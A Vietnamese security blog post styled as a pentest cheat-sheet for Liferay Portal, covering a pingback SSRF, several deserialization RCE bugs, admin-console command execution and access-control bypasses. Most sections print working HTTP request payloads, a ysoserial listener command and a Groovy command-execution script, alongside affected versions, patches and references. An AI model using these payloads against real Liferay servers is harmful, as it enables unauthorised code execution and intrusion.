<!DOCTYPE html>
<html lang="vi-vn">
<head>
  <link rel="preload" href="/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title> Liferay Pentest | devme4f blogs</title>
  <link rel = 'canonical' href = 'https://devme4f.github.io/posts/2023/liferay-pentest/'>
  
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="robots" content="all,follow">
  <meta name="googlebot" content="index,follow,snippet,archive">
  <meta property="og:title" content="Liferay Pentest" />
<meta property="og:description" content="Preface Bài viết tổng hợp một số lỗ hổng phổ biến / nghiêm trọng trên product Liferay đã được phát hiện, nhằm giúp người đọc (và mình) có cái nhìn tổng quan và cũng là cheat-sheet khi pentest các site Liferay.
Liferay Blind SSRF Pingback Affected version: &lt;= Liferay Portal 7.0.4 Lỗ hổng SSRF nằm trong tính năng blog pingback của liferay, cho phép gửi http get request đến địa chỉ bất kỳ." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://devme4f.github.io/posts/2023/liferay-pentest/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-05-25T22:08:11+07:00" />
<meta property="article:modified_time" content="2023-05-25T22:08:11+07:00" />

  <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Liferay Pentest"/>
<meta name="twitter:description" content="Preface Bài viết tổng hợp một số lỗ hổng phổ biến / nghiêm trọng trên product Liferay đã được phát hiện, nhằm giúp người đọc (và mình) có cái nhìn tổng quan và cũng là cheat-sheet khi pentest các site Liferay.
Liferay Blind SSRF Pingback Affected version: &lt;= Liferay Portal 7.0.4 Lỗ hổng SSRF nằm trong tính năng blog pingback của liferay, cho phép gửi http get request đến địa chỉ bất kỳ."/>

  
  
    
  
  
  <link rel="stylesheet" href="https://devme4f.github.io/css/styles.a7dd5af4c7ef9f93fb31b1147bb343d14667fd6cdafa7ae17de8d923a2f6a282b9db99fd91500efb76d5de5a5603d29fb153733d9bfac95b534e595d0ab745a7.css" integrity="sha512-p91a9Mfvn5P7MbEUe7ND0UZn/Wza&#43;nrhfejZI6L2ooK525n9kVAO&#43;3bV3lpWA9KfsVNzPZv6yVtTTlldCrdFpw=="> 

  
  
  
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  

  
<link rel="icon" type="image/png" href="https://devme4f.github.io/images/favicon.ico" />

  
  
</head>

<body class="max-width mx-auto px3 ltr">
  <div class="content index py4">

  <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
        <li><a href="/">Home</a></li>
         
        <li><a href="/posts">Archives</a></li>
         
        <li><a href="/tags">Tags</a></li>
         
        <li><a href="/about">About</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li>
          <a class="icon" href=" https://devme4f.github.io/posts/2023/angstromctf-2023_filestore/" aria-label="Previous">
            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
          </a>
        </li>
        
        
        <li>
          <a class="icon" href="https://devme4f.github.io/posts/2023/bkctf-2023_texttext/" aria-label="Next">
            <i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i>
          </a>
        </li>
        
        <li>
          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
          </a>
        </li>
        <li>
          <a class="icon" href="#" aria-label="Share">
            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
          </a>
        </li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      
      <ul>
  
  
    
  
  
  <li>
    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fliferay-pentest%2f" aria-label="Facebook">
      <i class="fab fa-facebook " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fliferay-pentest%2f&text=Liferay%20Pentest" aria-label="Twitter">
      <i class="fab fa-twitter " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fliferay-pentest%2f&title=Liferay%20Pentest" aria-label="Linkedin">
      <i class="fab fa-linkedin " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fliferay-pentest%2f&is_video=false&description=Liferay%20Pentest" aria-label="Pinterest">
      <i class="fab fa-pinterest " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="mailto:?subject=Liferay%20Pentest&body=Check out this article: https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fliferay-pentest%2f" aria-label="Email">
      <i class="fas fa-envelope " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fliferay-pentest%2f&title=Liferay%20Pentest" aria-label="Pocket">
      <i class="fab fa-get-pocket " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fliferay-pentest%2f&title=Liferay%20Pentest" aria-label="reddit">
      <i class="fab fa-reddit " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fliferay-pentest%2f&name=Liferay%20Pentest&description=Preface%20B%c3%a0i%20vi%e1%ba%bft%20t%e1%bb%95ng%20h%e1%bb%a3p%20m%e1%bb%99t%20s%e1%bb%91%20l%e1%bb%97%20h%e1%bb%95ng%20ph%e1%bb%95%20bi%e1%ba%bfn%20%2f%20nghi%c3%aam%20tr%e1%bb%8dng%20tr%c3%aan%20product%20Liferay%20%c4%91%c3%a3%20%c4%91%c6%b0%e1%bb%a3c%20ph%c3%a1t%20hi%e1%bb%87n%2c%20nh%e1%ba%b1m%20gi%c3%bap%20ng%c6%b0%e1%bb%9di%20%c4%91%e1%bb%8dc%20%28v%c3%a0%20m%c3%acnh%29%20c%c3%b3%20c%c3%a1i%20nh%c3%acn%20t%e1%bb%95ng%20quan%20v%c3%a0%20c%c5%a9ng%20l%c3%a0%20cheat-sheet%20khi%20pentest%20c%c3%a1c%20site%20Liferay.%0aLiferay%20Blind%20SSRF%20Pingback%20Affected%20version%3a%20%26lt%3b%3d%20Liferay%20Portal%207.0.4%20L%e1%bb%97%20h%e1%bb%95ng%20SSRF%20n%e1%ba%b1m%20trong%20t%c3%adnh%20n%c4%83ng%20blog%20pingback%20c%e1%bb%a7a%20liferay%2c%20cho%20ph%c3%a9p%20g%e1%bb%adi%20http%20get%20request%20%c4%91%e1%ba%bfn%20%c4%91%e1%bb%8ba%20ch%e1%bb%89%20b%e1%ba%a5t%20k%e1%bb%b3." aria-label="Tumblr">
      <i class="fab fa-tumblr " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fliferay-pentest%2f&t=Liferay%20Pentest" aria-label="Hacker News">
      <i class="fab fa-hacker-news " aria-hidden="true"></i>
    </a>
  </li>
</ul>

    </div>
    
    <div id="toc">
      <nav id="TableOfContents">
  <ul>
    <li><a href="#preface">Preface</a></li>
    <li><a href="#liferay-blind-ssrf-pingback">Liferay Blind SSRF Pingback</a>
      <ul>
        <li><a href="#payload">Payload</a></li>
        <li><a href="#patch">Patch</a></li>
        <li><a href="#tham-khảo">Tham khảo</a></li>
      </ul>
    </li>
    <li><a href="#liferay-json-deserialization-rce---cve-2019-16891">Liferay JSON Deserialization RCE - CVE-2019-16891\</a>
      <ul>
        <li><a href="#payload-1">Payload</a></li>
        <li><a href="#new-endpoint">New endpoint</a></li>
        <li><a href="#patch-1">Patch</a></li>
        <li><a href="#tham-khảo-1">Tham khảo</a></li>
      </ul>
    </li>
    <li><a href="#liferay-deserialization-rce-via-json-web-services-jsonws---cve-2020-7961">Liferay deserialization RCE via JSON web services (JSONWS) - CVE-2020-7961</a>
      <ul>
        <li><a href="#payload-2">Payload</a></li>
        <li><a href="#tham-khảo-2">Tham khảo</a></li>
      </ul>
    </li>
    <li><a href="#liferay-os-command-injection-administrator-privileges---cve-2020-28884-cve-2020-28885">Liferay OS Command Injection (Administrator Privileges) - CVE-2020-28884; CVE-2020-28885</a>
      <ul>
        <li><a href="#groovy-script">Groovy Script</a></li>
        <li><a href="#gogo-shell">Gogo Shell</a></li>
        <li><a href="#patch-2">Patch</a></li>
        <li><a href="#tham-khảo-3">Tham khảo</a></li>
      </ul>
    </li>
    <li><a href="#liferay-tunnelservlet-deserialization---2017">Liferay TunnelServlet Deserialization - 2017</a>
      <ul>
        <li><a href="#payload-3">Payload</a></li>
        <li><a href="#tham-khảo-4">Tham khảo</a></li>
      </ul>
    </li>
    <li><a href="#random">Random</a>
      <ul>
        <li><a href="#misconfiguration-exposes-liferay-page">Misconfiguration exposes liferay page</a></li>
      </ul>
    </li>
  </ul>
</nav>
    </div>
    
  </span>
</div>


  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
    <header>
      <h1 class="posttitle" itemprop="name headline">
        Liferay Pentest
      </h1>
      <div class="meta">
        
        <div class="postdate">
          
          <time datetime="2023-05-25 22:08:11 &#43;0700 &#43;07" itemprop="datePublished">2023-05-25</time>
          
        </div>
        
        
        
        
        <div class="article-tag">
            <i class="fas fa-tag"></i>
            
            
            <a class="tag-link" href="/tags/research" rel="tag">research</a>
            
             ,  
            <a class="tag-link" href="/tags/liferay" rel="tag">liferay</a>
            
             ,  
            <a class="tag-link" href="/tags/cve" rel="tag">cve</a>
            
        </div>
        
      </div>
    </header>

  
    
    <div class="content" itemprop="articleBody">
      <p><img src="/images/2023/Liferay-Pentest/theme.png" alt="theme"></p>
<h2 id="preface">Preface</h2>
<p>Bài viết tổng hợp một số lỗ hổng phổ biến / nghiêm trọng trên product Liferay đã được phát hiện, nhằm giúp người đọc (và mình) có cái nhìn tổng quan và cũng là cheat-sheet khi pentest các site Liferay.</p>
<h2 id="liferay-blind-ssrf-pingback">Liferay Blind SSRF Pingback</h2>
<ul>
<li><strong>Affected version</strong>: <code>&lt;= Liferay Portal 7.0.4</code>
Lỗ hổng SSRF nằm trong tính năng blog pingback của liferay, cho phép gửi http get request đến địa chỉ bất kỳ.</li>
</ul>
<h3 id="payload">Payload</h3>
<p>Blind SSRF:</p>
<pre tabindex="0"><code>POST /xmlrpc/pingback HTTP/1.1
Host: liferay.dev

&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;&lt;methodCall&gt;&lt;methodName&gt;pingback.ping&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;http://[ADDRESS]]?so_tnmt=deum3&lt;/value&gt;
&lt;/param&gt;&lt;param&gt;&lt;value&gt;1&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;
</code></pre><p><img src="/images/2023/Liferay-Pentest/pingback_ok.png" alt="pingback_ok"></p>
<h3 id="patch">Patch</h3>
<p>Disable module pingback của liferay: thêm <code>blogs.pingback.enabled=false</code> vào <code>portal-ext.properties</code>
<img src="/images/2023/Liferay-Pentest/pingback_patch.png" alt="pingback_patch"></p>
<h3 id="tham-khảo">Tham khảo</h3>
<ol>
<li><a href="https://liferay.dev/blogs/-/blogs/clarification-on-recent-ssrf-vulnerability-report">https://liferay.dev/blogs/-/blogs/clarification-on-recent-ssrf-vulnerability-report</a></li>
<li><a href="https://www.exploit-db.com/exploits/44945">https://www.exploit-db.com/exploits/44945</a></li>
<li>fix: <a href="https://github.com/liferay/liferay-portal/commit/64ccec102b6ea38ff842c95bf12218734fe26ca8">LPS-49419 Avoid targetting local network</a>; <a href="https://github.com/liferay/liferay-portal/commit/d00e102b623d9d93264290a96b0cd965bc0fb69b">LPS-49419 Check also 0.0.0.0</a>; check blog exists by parsing target URI (BlogsEntryPersistenceImpl#fetchByG_UT)</li>
</ol>
<h2 id="liferay-json-deserialization-rce---cve-2019-16891">Liferay JSON Deserialization RCE - CVE-2019-16891\</h2>
<ul>
<li><strong>Affected version</strong>: <code>Liferay &lt;7.x</code></li>
<li>JSON deserialize gọi đến remote RMI server dẫn đến RCE</li>
<li>Authenticate required</li>
</ul>
<h3 id="payload-1">Payload</h3>
<pre tabindex="0"><code>POST /poller/anything HTTP/1.1
Host: liferay.dev
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

pollerRequest=[$OPEN_CURLY_BRACE$]&#34;javaClass&#34;:&#34;com.mchange.v2.c3p0.jboss.C3P0PooledDataSource&#34;,&#34;jndiName&#34;:&#34;rmi:///jndi/rmi://localhost:1099&#34;[$CLOSE_CURLY_BRACE$]
</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener <span style="color:#ae81ff">1099</span> CommonsCollections5 calc.exe
</span></span></code></pre></div><h3 id="new-endpoint">New endpoint</h3>
<ul>
<li><strong>Affected version</strong>: <code>Version &lt;= 7.1.0</code></li>
<li>Không cần escape dấu ngoặc nhọn như endpoint trên</li>
<li>Map đến Portlet URL - mặc định bị tắt</li>
<li>Unauthenticated, verify bug với <code>GET /c/portal/portlet_url</code> ==&gt; status 200</li>
</ul>
<pre tabindex="0"><code>POST /c/portal/portlet_url HTTP/1.1
Host: liferay.dev

parameterMap={&#34;Json payload for deserialization in here!&#34;}
</code></pre><h3 id="patch-1">Patch</h3>
<ol>
<li><code>/poller/*</code>: Không dùng liferay 6.x nữa</li>
<li><code>/c/portal/portlet_url</code>:</li>
</ol>
<ul>
<li><code>Liferay Portal 7.1</code>: There is no patch available for Liferay Portal 7.1.0. Instead, users should upgrade to Liferay Portal 7.1 CE GA2 (7.1.1) or later.</li>
<li><code>Liferay Portal 7.0</code>: Source patch for Liferay Portal 7.0 GA7 (7.0.6) is available on GitHub. Details for working with source patches can be found on the Patching Liferay Portal page.</li>
<li><code>Liferay Portal 6.2</code>: Source patch for Liferay Portal 6.2 GA6 (6.2.5) is available on GitHub. Details for working with source patches can be found on the Patching Liferay Portal page.</li>
</ul>
<h3 id="tham-khảo-1">Tham khảo</h3>
<ol>
<li><a href="https://sec.vnpt.vn/2019/09/liferay-deserialization-json-deserialization-part-4/">https://sec.vnpt.vn/2019/09/liferay-deserialization-json-deserialization-part-4/</a></li>
<li><a href="https://devme4f.github.io/posts/2023/liferay_cve-2019-16891/">https://devme4f.github.io/posts/2023/liferay_cve-2019-16891/</a></li>
<li><a href="https://dappsec.substack.com/p/an-advisory-for-cve-2019-16891-from">https://dappsec.substack.com/p/an-advisory-for-cve-2019-16891-from</a></li>
</ol>
<h2 id="liferay-deserialization-rce-via-json-web-services-jsonws---cve-2020-7961">Liferay deserialization RCE via JSON web services (JSONWS) - CVE-2020-7961</h2>
<ul>
<li><strong>Affected version</strong>: <code>&lt; 7.2.1 CE GA2</code></li>
<li>Liferay hỗ trợ api json web service tại <code>/api/jsonws</code> để có thể invoke các phương thức web service</li>
<li>Unauthenticated do việc exploit deserialization xảy ra trước khi hoàn thành quá trình invoke service</li>
</ul>
<h3 id="payload-2">Payload</h3>
<p>Không cần outbound <a href="https://gist.github.com/testanull/4bb77519acf2c8e919f8d9b015eda880">memshell</a>:</p>
<pre tabindex="0"><code>POST /api/jsonws/invoke HTTP/1.1
Host: liferay.dev
Content-Type: application/x-www-form-urlencoded
cmd2: whoami

cmd={&#34;/expandocolumn/update-column&#34;:{}}&amp;p_auth=&lt;valid token&gt;&amp;formDate=&lt;date&gt;&amp;columnId=123&amp;name=asdasd&amp;type=1&amp;defaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource={&#34;userOverridesAsString&#34;:&#34;HexAsciiSerializedMap:ACED000...;&#34;}
</code></pre><p><a href="https://www.synacktiv.com/en/publications/how-to-exploit-liferay-cve-2020-7961-quick-journey-to-poc.html">blog</a> cần outbound deser qua chain <code>C3P0PooledDataSource</code></p>
<h3 id="tham-khảo-2">Tham khảo</h3>
<ol>
<li><a href="https://www.facebook.com/notes/1263154994069383/">https://www.facebook.com/notes/1263154994069383/</a></li>
<li><a href="https://codewhitesec.blogspot.com/2020/03/liferay-portal-json-vulns.html">https://codewhitesec.blogspot.com/2020/03/liferay-portal-json-vulns.html</a></li>
</ol>
<h2 id="liferay-os-command-injection-administrator-privileges---cve-2020-28884-cve-2020-28885">Liferay OS Command Injection (Administrator Privileges) - CVE-2020-28884; CVE-2020-28885</h2>
<ul>
<li><strong>Affected version</strong>: tested on <code>7.3.5 GA6, 7.2.0 GA1</code></li>
<li>User quyền admin có thể thực thi server-side scripts trên liferay console dẫn đến RCE.</li>
<li>Security bug/Design flaw??</li>
</ul>
<h3 id="groovy-script">Groovy Script</h3>
<p>Administrator can execute Groovy Script, access this:</p>
<pre tabindex="0"><code>/group/control_panel/manage?p_p_id=com_liferay_server_admin_web_portlet_ServerAdminPortlet&amp;p_p_lifecycle=0&amp;p_p_state=maximized&amp;p_p_mode=view&amp;_com_liferay_server_admin_web_portlet_ServerAdminPortlet_mvcRenderCommandName=%2Fserver_admin%2Fview&amp;_com_liferay_server_admin_web_portlet_ServerAdminPortlet_tabs1=script
</code></pre><p><img src="/images/2023/Liferay-Pentest/GroovyScript.png" alt="GroovyScript"></p>
<p>Run this groovy script:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-groovy" data-lang="groovy"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> sout <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> StringBuilder<span style="color:#f92672">(),</span> serr <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> StringBuilder<span style="color:#f92672">()</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> proc <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;[command]&#39;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">execute</span><span style="color:#f92672">()</span>
</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span><span style="color:#a6e22e">consumeProcessOutput</span><span style="color:#f92672">(</span>sout<span style="color:#f92672">,</span> serr<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span><span style="color:#a6e22e">waitForOrKill</span><span style="color:#f92672">(</span><span style="color:#ae81ff">1000</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>println <span style="color:#e6db74">&#34;out&gt; $sout err&gt; $serr&#34;</span>
</span></span></code></pre></div><h3 id="gogo-shell">Gogo Shell</h3>
<p>Liferay Portal control panel, Gogo shell</p>
<pre tabindex="0"><code>/group/control_panel/manage?p_p_id=com_liferay_gogo_shell_web_internal_portlet_GogoShellPortlet&amp;p_p_lifecycle=0&amp;p_p_state=maximized&amp;p_p_mode=view&amp;_com_liferay_gogo_shell_web_internal_portlet_GogoShellPortlet_javax.portlet.action=executeCommand&amp;p_p_auth=GQ1fDPiH
</code></pre><p>Run:
<img src="/images/2023/Liferay-Pentest/gogoShell.png" alt="gogoShell"></p>
<h3 id="patch-2">Patch</h3>
<p><img src="/images/2023/Liferay-Pentest/gogoShellPatch.png" alt="gogoShellPatch"></p>
<h3 id="tham-khảo-3">Tham khảo</h3>
<ol>
<li><a href="https://medium.com/@tranpdanh/some-way-to-execute-os-command-in-liferay-portal-84498bde18d3">https://medium.com/@tranpdanh/some-way-to-execute-os-command-in-liferay-portal-84498bde18d3</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JAVA-COMLIFERAY-2386905">https://security.snyk.io/vuln/SNYK-JAVA-COMLIFERAY-2386905</a></li>
<li><a href="https://learn.liferay.com/en/w/dxp/system-administration/using-the-script-engine/running-scripts-from-the-script-console">https://learn.liferay.com/en/w/dxp/system-administration/using-the-script-engine/running-scripts-from-the-script-console</a></li>
</ol>
<h2 id="liferay-tunnelservlet-deserialization---2017">Liferay TunnelServlet Deserialization - 2017</h2>
<p><strong>Afffected version</strong>:</p>
<ul>
<li><code>/api/liferay</code>, <code>/api/spring/.+</code> đều deserialize object từ post request body tuy nhiên các servlet này chỉ có thể truy cập từ localhost</li>
<li>Nếu server cấu hình sai, ví dụ có reverse proxy đứng phía trước web server, khi forward request đến liferay - request được coi như gọi từ localhost ==&gt; endpoint accessable ==&gt; exploitable</li>
<li>Bypass localhost restrict configuration khi fillterchain lỗi
<img src="/images/2023/Liferay-Pentest/TunnelServlet.png" alt="TunnelServlet">
<img src="/images/2023/Liferay-Pentest/TunnelServletDoPost.png" alt="TunnelServletDoPost"></li>
</ul>
<h3 id="payload-3">Payload</h3>
<pre tabindex="0"><code>POST /api/liferay HTTP/1.1
Host: liferay.dev

serialized_string
</code></pre><p>Endpoint khác: <code>/api/spring</code> implements <code>DispatcherServlet</code> cũng dính lỗi deser qua post req body</p>
<pre tabindex="0"><code>POST /api/spring/com_liferay_portal_service_spring_UserService-http HTTP/1.1
Host: liferay.dev

serialized_string
</code></pre><p><strong>Bypass</strong>:
Filter lỗi &ndash;&gt; <code>////api///////liferay</code>, <code>///api///////spring</code>
nginx forward fails: <code>/#/../api/liferay</code></p>
<h3 id="tham-khảo-4">Tham khảo</h3>
<ol>
<li>series liferay sec.vnpt.vn</li>
<li><a href="https://www.tenable.com/security/research/tra-2017-01">https://www.tenable.com/security/research/tra-2017-01</a></li>
<li><a href="https://nguyendt.hashnode.dev/lpe-15538">https://nguyendt.hashnode.dev/lpe-15538</a></li>
</ol>
<h2 id="random">Random</h2>
<h3 id="misconfiguration-exposes-liferay-page">Misconfiguration exposes liferay page</h3>
<p>403: <code>/web/guest/dangnhap</code>
<img src="/images/2023/Liferay-Pentest/403.png" alt="403"></p>
<p>Thay đổi ngôn ngữ: <code>/en_US/web/guest/dangnhap</code>
<img src="/images/2023/Liferay-Pentest/languageCode.png" alt="languageCode"></p>
<p>Good luck!!!</p>

    </div>
  </article>

  
  






  <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/posts">Archives</a></li>
         
          <li><a href="/tags">Tags</a></li>
         
          <li><a href="/about">About</a></li>
        
      </ul>
    </div>

    
    <div id="toc-footer" style="display: none">
      <nav id="TableOfContents">
  <ul>
    <li><a href="#preface">Preface</a></li>
    <li><a href="#liferay-blind-ssrf-pingback">Liferay Blind SSRF Pingback</a>
      <ul>
        <li><a href="#payload">Payload</a></li>
        <li><a href="#patch">Patch</a></li>
        <li><a href="#tham-khảo">Tham khảo</a></li>
      </ul>
    </li>
    <li><a href="#liferay-json-deserialization-rce---cve-2019-16891">Liferay JSON Deserialization RCE - CVE-2019-16891\</a>
      <ul>
        <li><a href="#payload-1">Payload</a></li>
        <li><a href="#new-endpoint">New endpoint</a></li>
        <li><a href="#patch-1">Patch</a></li>
        <li><a href="#tham-khảo-1">Tham khảo</a></li>
      </ul>
    </li>
    <li><a href="#liferay-deserialization-rce-via-json-web-services-jsonws---cve-2020-7961">Liferay deserialization RCE via JSON web services (JSONWS) - CVE-2020-7961</a>
      <ul>
        <li><a href="#payload-2">Payload</a></li>
        <li><a href="#tham-khảo-2">Tham khảo</a></li>
      </ul>
    </li>
    <li><a href="#liferay-os-command-injection-administrator-privileges---cve-2020-28884-cve-2020-28885">Liferay OS Command Injection (Administrator Privileges) - CVE-2020-28884; CVE-2020-28885</a>
      <ul>
        <li><a href="#groovy-script">Groovy Script</a></li>
        <li><a href="#gogo-shell">Gogo Shell</a></li>
        <li><a href="#patch-2">Patch</a></li>
        <li><a href="#tham-khảo-3">Tham khảo</a></li>
      </ul>
    </li>
    <li><a href="#liferay-tunnelservlet-deserialization---2017">Liferay TunnelServlet Deserialization - 2017</a>
      <ul>
        <li><a href="#payload-3">Payload</a></li>
        <li><a href="#tham-khảo-4">Tham khảo</a></li>
      </ul>
    </li>
    <li><a href="#random">Random</a>
      <ul>
        <li><a href="#misconfiguration-exposes-liferay-page">Misconfiguration exposes liferay page</a></li>
      </ul>
    </li>
  </ul>
</nav>
    </div>
    

    <div id="share-footer" style="display: none">
      
      <ul>
  
  
    
  
  
  <li>
    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fliferay-pentest%2f" aria-label="Facebook">
      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fliferay-pentest%2f&text=Liferay%20Pentest" aria-label="Twitter">
      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fliferay-pentest%2f&title=Liferay%20Pentest" aria-label="Linkedin">
      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fliferay-pentest%2f&is_video=false&description=Liferay%20Pentest" aria-label="Pinterest">
      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="mailto:?subject=Liferay%20Pentest&body=Check out this article: https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fliferay-pentest%2f" aria-label="Email">
      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fliferay-pentest%2f&title=Liferay%20Pentest" aria-label="Pocket">
      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fliferay-pentest%2f&title=Liferay%20Pentest" aria-label="reddit">
      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fliferay-pentest%2f&name=Liferay%20Pentest&description=Preface%20B%c3%a0i%20vi%e1%ba%bft%20t%e1%bb%95ng%20h%e1%bb%a3p%20m%e1%bb%99t%20s%e1%bb%91%20l%e1%bb%97%20h%e1%bb%95ng%20ph%e1%bb%95%20bi%e1%ba%bfn%20%2f%20nghi%c3%aam%20tr%e1%bb%8dng%20tr%c3%aan%20product%20Liferay%20%c4%91%c3%a3%20%c4%91%c6%b0%e1%bb%a3c%20ph%c3%a1t%20hi%e1%bb%87n%2c%20nh%e1%ba%b1m%20gi%c3%bap%20ng%c6%b0%e1%bb%9di%20%c4%91%e1%bb%8dc%20%28v%c3%a0%20m%c3%acnh%29%20c%c3%b3%20c%c3%a1i%20nh%c3%acn%20t%e1%bb%95ng%20quan%20v%c3%a0%20c%c5%a9ng%20l%c3%a0%20cheat-sheet%20khi%20pentest%20c%c3%a1c%20site%20Liferay.%0aLiferay%20Blind%20SSRF%20Pingback%20Affected%20version%3a%20%26lt%3b%3d%20Liferay%20Portal%207.0.4%20L%e1%bb%97%20h%e1%bb%95ng%20SSRF%20n%e1%ba%b1m%20trong%20t%c3%adnh%20n%c4%83ng%20blog%20pingback%20c%e1%bb%a7a%20liferay%2c%20cho%20ph%c3%a9p%20g%e1%bb%adi%20http%20get%20request%20%c4%91%e1%ba%bfn%20%c4%91%e1%bb%8ba%20ch%e1%bb%89%20b%e1%ba%a5t%20k%e1%bb%b3." aria-label="Tumblr">
      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
